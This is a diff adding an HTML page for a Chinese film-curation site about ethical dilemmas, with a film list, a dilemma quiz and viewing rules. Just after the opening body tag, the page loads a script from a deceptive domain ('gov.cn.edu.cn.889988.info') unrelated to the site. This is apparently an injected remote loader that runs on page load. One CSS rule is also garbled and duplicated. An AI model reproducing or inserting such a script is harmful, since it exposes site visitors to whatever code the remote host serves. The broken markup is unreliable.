@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>伦理电影网 - 家庭、人性、社会与道德困境的深度片单</title>
+<meta name="description" content="伦理电影网（sanjilunlidianyingwang-h5）整理家庭伦理、社会伦理、人性探讨、职业与科技伦理类电影电视剧：用光影讨论亲情、婚姻、阶级、正义与选择。官方网址：https://sanjilunlidianyingwang-h5.github.io">
+<meta name="keywords" content="伦理电影网, sanjilunlidianyingwang-h5, 伦理片, 家庭伦理, 社会伦理, 人性电影, 道德困境, 剧情片">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Songti SC","Microsoft YaHei",serif;
+  background:#0c0f14;color:#e7e3d8;line-height:1.8;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(760px 360px at 12% 8%, rgba(196,164,98,.12), transparent 55%),
+    radial-gradient(720px 340px at 88% 92%, rgba(96,120,160,.12), transparent 55%),
+    #0c0f14;
+}
+.ln-nav{
+  position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;
+  padding:12px 20px;background:rgba(12,15,20,.86);backdrop-filter:blur(10px);
+  border-bottom:1px solid rgba(196,164,98,.25);
+}
+.ln-nav .logo{font-size:20px;font-weight:900;letter-spacing:1px}
+.ln-nav .logo b{color:#c4a462}
+.ln-nav .logo i{color:#8fa6c8;font-style:normal}
+.ln-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.ln-nav .links a{font-size:13px;color:#c9c3b4;padding:6px 12px;border-radius:20px;transition:.25s}
+.ln-nav .links a:hover{background:rgba(196,164,98,.14);color:#c4a462}
+
+.hero{padding:66px 20px 46px;text-align:center}
+.hero .kick{font-size:12px;letter-spacing:5px;text-transform:uppercase;color:#8fa6c8}
+.hero h1{font-size:40px;font-weight:900;color:#f3efe6;margin:10px 0 12px}
+.hero h1 b{color:#c4a462}
+.hero p{color:#c9c3b4;max-width:620px;margin:0 auto 18px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#0c0f14;font-weight:700;background:#c4a462;padding:8px 18px;border-radius:30px}
+
+/* 道德两难卡 */
+.dilemma{max-width:760px;margin:26px auto 0;border:1px solid rgba(143,166,200,.25);border-radius:16px;
+  background:linear-gradient(160deg,#11151c,#0c0f14);padding:26px}
+.dilemma .q{font-size:15px;color:#c4a462;letter-spacing:1px;margin-bottom:10px}
+.dilemma .scene{font-size:17px;color:#f3efe6;margin-bottom:18px}
+.dilemma .opts{display:flex;gap:12px;flex-wrap:wrap;justify-content:center}
+.dilemma .opts button{flex:1;min-width:200px;background:#0c0f14;border:1px solid rgba(196,164,98,.35);
+  color:#e7e3d8;padding:14px;border-radius:12px;cursor:pointer;font-size:14px;transition:.25s}
+.dilemma .opts button:hover{border-color:#c4a462;background:rgba(196,164,98,.1)}
+.dilemma .result{margin-top:16px;font-size:14px;color:#9fb0cc;min-height:22px}
+
+.wrap{max-width:1140px;margin:0 auto;padding:64px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#7d8aa3;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#f3efe6;margin-bottom:30px}
+.sec-title b{color:#c4a462}
+
+/* 栏目一：伦理维度 */
+.dim{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.dim-card{background:#10141b;border:1px solid rgba(143,166,200,.18);border-radius:14px;padding:22px;transition:.3s}
+.dim-card:hover{transform:translateY(-4px);border-color:#c4a462;box-shadow:0 16px 36px rgba(196,164,98,.08)}
+.dim-card .ic{font-size:26px;margin-bottom:10px}
+.dim-card h4{color:#f3efe6;font-size:17px;margin-bottom:6px}
+.dim-card p{color:#b9b3a4;font-size:13px;margin-bottom:10px}
+.dim-card .ex{font-size:12px;color:#8fa6c8}
+.dim-card.d2{border-top:3px solid #8fa6c8}
+.dim-card.d3{border-top:3px solid #b98fb0}
+.dim-card.d4{border-top:3px solid #7bbf9c}
+.dim-card.d5{border-top:3px solid #d08b6a}
+
+/* 栏目二：经典片单 */
+.film-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px}
+.film{background:#10141b;border:1px solid rgba(196,164,98,.18);border-radius:14px;overflow:hidden}
+.film .cv{height:120px;position:relative}
+.film .cv.a{background:linear-gradient(135deg,#2a2113,#c4a462)}
+.film .cv.b{background:linear-gradient(135deg,#1a2230,#5f7characters)}
+.film .cv.b{background:linear-gradient(135deg,#1a2230,#5f7aa0)}
+.film .cv.c{background:linear-gradient(135deg,#2a1622,#b98fb0)}
+.film .cv.d{background:linear-gradient(135deg,#10231c,#7bbf9c)}
+.film .cv.e{background:linear-gradient(135deg,#2a1a14,#d08b6a)}
+.film .cv .yr{position:absolute;left:12px;bottom:12px;font-size:12px;color:#0c0f14;background:#c4a462;padding:3px 10px;border-radius:20px;font-weight:700}
+.film .body{padding:16px 18px}
+.film .body h4{color:#f3efe6;font-size:16px;margin-bottom:4px}
+.film .body .meta{font-size:12px;color:#8fa6c8;margin-bottom:8px}
+.film .body p{font-size:13px;color:#b9b3a4;margin:0}
+.film .body .tag{display:inline-block;margin-top:10px;font-size:11px;color:#c4a462;border:1px solid rgba(196,164,98,.35);padding:3px 10px;border-radius:20px}
+
+/* 栏目三：道德光谱 */
+.spectrum{border:1px solid rgba(143,166,200,.22);border-radius:16px;padding:28px;background:#10141b}
+.spec-row{display:flex;align-items:center;gap:14px;margin-bottom:16px}
+.spec-row:last-child{margin-bottom:0}
+.spec-row .lab{width:120px;font-size:13px;color:#c4a462;font-weight:700;flex:0 0 120px}
+.spec-bar{flex:1;height:10px;border-radius:8px;background:#1b212b;overflow:hidden}
+.spec-bar i{display:block;height:100%;background:linear-gradient(90deg,#5f7aa0,#c4a462)}
+.spec-row .val{width:42px;text-align:right;font-size:12px;color:#9fb0cc}
+
+/* 栏目四：观影守则 */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.rule{background:#0e1218;border:1px solid rgba(196,164,98,.2);border-left:4px solid #c4a462;border-radius:12px;padding:20px}
+.rule h4{color:#f3efe6;font-size:16px;margin-bottom:6px}
+.rule p{color:#b9b3a4;font-size:13px;margin:0}
+
+.foot{text-align:center;padding:36px 20px;background:#080a0d;border-top:1px solid rgba(196,164,98,.15);color:#6f7787;font-size:13px}
+.foot a{color:#c4a462}
+.foot .lg{font-size:18px;font-weight:900;color:#e7e3d8;margin-bottom:8px}
+
+@media(max-width:640px){
+  .hero h1{font-size:28px}
+  .ln-nav .links a{font-size:12px;padding:5px 9px}
+  .spec-row .lab{flex-basis:90px;width:90px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="ln-nav">
+  <div class="logo">伦理电影网 <b>· 人性读数</b> <i>/ Ethics</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#dims">伦理维度</a>
+    <a href="#films">经典片单</a>
+    <a href="#spectrum">道德光谱</a>
+    <a href="#rules">观影守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="kick">CINEMA · ETHICS · CHOICE</div>
+  <h1>伦理电影网：<b>不是猎奇</b>，是看人怎么选</h1>
+  <p>家庭、婚姻、阶级、正义、科技、职业——伦理片把人放进没有标准答案的处境里。这里只整理“值得讨论”的片子，不堆擦边标题，不卖盗版资源。</p>
+  <span class="url">🌐 https://sanjilunlidianyingwang-h5.github.io</span>
+
+  <div class="dilemma">
+    <div class="q">今晚先想一个问题</div>
+    <div class="scene" id="dl-scene">医生只有一支药：救自己孩子，还是救带来疫情解药的科学家？</div>
+    <div class="opts">
+      <button onclick="answer('child')">救孩子——亲情优先</button>
+      <button onclick="answer('scientist')">救科学家——救更多人</button>
+      <button onclick="answer('refuse')">都不选——制度才有错</button>
+    </div>
+    <div class="result" id="dl-result">点一个选项，看它属于哪种伦理立场。</div>
+  </div>
+</header>
+
+<section id="dims" class="wrap">
+  <div class="kicker">ETHICAL DIMENSIONS</div>
+  <h2 class="sec-title">伦理片的 <b>五个维度</b></h2>
+  <div class="dim">
+    <div class="dim-card d1"><div class="ic">🏠</div><h4>家庭伦理</h4><p>夫妻、亲子、代际、赡养、原生家庭。</p><div class="ex">《饮食男女》《都挺好》《小偷家族》</div></div>
+    <div class="dim-card d2"><div class="ic">🏙️</div><h4>社会伦理</h4><p>阶级、权力、司法、舆论、群体暴力。</p><div class="ex">《寄生虫》《狩猎》《熔炉》</div></div>
+    <div class="dim-card d3"><div class="ic">💔</div><h4>情感伦理</h4><p>婚姻、婚外情、爱与责任、激情与承诺。</p><div class="ex">《廊桥遗梦》《蓝色情人节》《昼颜》</div></div>
+    <div class="dim-card d4"><div class="ic">🩺</div><h4>职业/科技伦理</h4><p>医生、律师、AI、隐私、生命终点。</p><div class="ex">《生死朗读》《她》《生命线》</div></div>
+    <div class="dim-card d5"><div class="ic">⚖️</div><h4>人性边界</h4><p>善与恶、良知与生存、救赎与报复。</p><div class="ex">《狗镇》《老男孩》《海边的曼彻斯特》</div></div>
+  </div>
+</section>
+
+<section id="films" class="wrap">
+  <div class="kicker">CURATED ETHICAL FILMS</div>
+  <h2 class="sec-title">伦理电影网 <b>片单</b></h2>
+  <div class="film-grid">
+    <div class="film"><div class="cv a"><span class="yr">2011</span></div><div class="body"><h4>一次别离</h4><div class="meta">伊朗 / 剧情 / 家庭·社会</div><p>移民、护工、宗教与阶级，在一桩离婚里同时崩裂。</p><span class="tag">道德无赢家</span></div></div>
+    <div class="film"><div class="cv b"><span class="yr">2012</span></div><div class="body"><h4>狩猎</h4><div class="meta">丹麦 / 剧情 / 社会·舆论</div><p>一句孩子的话，足以让一个成年人被整个小镇审判。</p><span class="tag">群体暴力</span></div></div>
+    <div class="film"><div class="cv c"><span class="yr">1995</span></div><div class="body"><h4>廊桥遗梦</h4><div class="meta">美国 / 爱情 / 情感伦理</div><p>四天爱情，半生克制：激情和责任未必同路。</p><span class="tag">爱与责任</span></div></div>
+    <div class="film"><div class="cv d"><span class="yr">2018</span></div><div class="body"><h4>小偷家族</h4><div class="meta">日本 / 剧情 / 家庭·社会</div><p>没有血缘的一家人，偷东西也偷来了互相取暖。</p><span class="tag">家庭是什么</span></div></div>
+    <div class="film"><div class="cv e"><span class="yr">2019</span></div><div class="body"><h4>婚姻故事</h4><div class="meta">美国 / 剧情 / 婚姻伦理</div><p>从“我们”到“我”，离婚把爱和最狠的话一起逼出来。</p><span class="tag">亲密关系</span></div></div>
+    <div class="film"><div class="cv b"><span class="yr">2013</span></div><div class="body"><h4>她</h4><div class="meta">美国 / 科幻·爱情 / 科技伦理</div><p>爱上一个操作系统：孤独、依恋和人形边界。</p><span class="tag">AI 与爱</span></div></div>
+  </div>
+</section>
+
+<section id="spectrum" class="wrap">
+  <div class="kicker">MORAL SPECTRUM</div>
+  <h2 class="sec-title">好伦理片，<b>不站队</b></h2>
+  <div class="spectrum">
+    <div class="spec-row"><div class="lab">角色灰度</div><div class="spec-bar"><i style="width:82%"></i></div><div class="val">82</div></div>
+    <div class="spec-row"><div class="lab">道德两难</div><div class="spec-bar"><i style="width:90%"></i></div><div class="val">90</div></div>
+    <div class="spec-row"><div class="lab">社会映射</div><div class="spec-bar"><i style="width:76%"></i></div><div class="val">76</div></div>
+    <div class="spec-row"><div class="lab">说教程度</div><div class="spec-bar"><i style="width:18%"></i></div><div class="val">18</div></div>
+    <div class="spec-row"><div class="lab">重看价值</div><div class="spec-bar"><i style="width:88%"></i></div><div class="val">88</div></div>
+    <p style="margin-top:18px;color:#b9b3a4;font-size:14px">伦理电影网挑片标准：宁可复杂，不要正确；宁可有余味，不要给结论。</p>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">VIEWING RULES</div>
+  <h2 class="sec-title">本站 <b>观影守则</b></h2>
+  <div class="rules">
+    <div class="rule"><h4>1. 不把电影当答案</h4><p>伦理片的价值在“难选”，不在“编剧替你选”。</p></div>
+    <div class="rule"><h4>2. 不消费苦难</h4><p>素媛、熔炉、嘉年华值得被认真谈，不该做标题党。</p></div>
+    <div class="rule"><h4>3. 不碰未授权资源</h4><p>本页只做片单、解析与导航，不提供盗版提取码。</p></div>
+    <div class="rule"><h4>4. 允许不舒服</h4><p>能让你别过脸的镜头，往往才是片子想问的问题。</p></div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="lg">🎞️ 伦理电影网</div>
+  官方网址：<a href="https://sanjilunlidianyingwang-h5.github.io">https://sanjilunlidianyingwang-h5.github.io</a><br>
+  © 2026 伦理电影网｜家庭 / 人性 / 社会 / 道德困境 · 深度片单
+</footer>
+
+<script>
+function answer(t){
+  var box=document.getElementById('dl-result');
+  if(t==='child') box.textContent='亲情利己主义：近处的责任先于人间的平均数。';
+  if(t==='scientist') box.textContent='功利主义：一个命换千万命，但谁有权力替孩子死？';
+  if(t==='refuse') box.textContent='制度伦理：问题不该由个人在急诊室里解决。';
+}
+</script>
+
+</body>
+</html>
